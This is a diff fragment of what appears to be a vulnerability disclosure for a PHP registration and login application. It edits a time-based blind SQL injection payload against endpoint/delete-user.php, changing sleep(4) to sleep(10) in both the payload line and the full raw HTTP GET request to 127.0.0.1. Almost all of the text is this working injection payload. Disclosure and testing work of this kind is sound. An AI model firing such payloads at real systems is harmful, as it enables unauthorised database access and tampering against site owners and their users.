@@ -11,10 +11,10 @@ dbname = registration_login_db
 Vulnerability File: /endpoint/add-user.php ;/home.php
 
 
-[+] payload: endpoint/delete-user.php?user=(select(0)from(select(sleep(4)))v)/*'%2B(select(0)from(select(sleep(4)))v)%2B'"%2B(select(0)from(select(sleep(4)))v)%2B"*/
+[+] payload: endpoint/delete-user.php?user=(select(0)from(select(sleep(10)))v)/*'%2B(select(0)from(select(sleep(10)))v)%2B'"%2B(select(0)from(select(sleep(10)))v)%2B"*/
 
 ```
-GET /endpoint/delete-user.php?user=(select(0)from(select(sleep(4)))v)/*'%2B(select(0)from(select(sleep(4)))v)%2B'"%2B(select(0)from(select(sleep(4)))v)%2B"*/ HTTP/1.1
+GET /endpoint/delete-user.php?user=(select(0)from(select(sleep(10)))v)/*'%2B(select(0)from(select(sleep(10)))v)%2B'"%2B(select(0)from(select(sleep(10)))v)%2B"*/ HTTP/1.1
 X-Requested-With: XMLHttpRequest
 Referer: http://127.0.0.1/
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
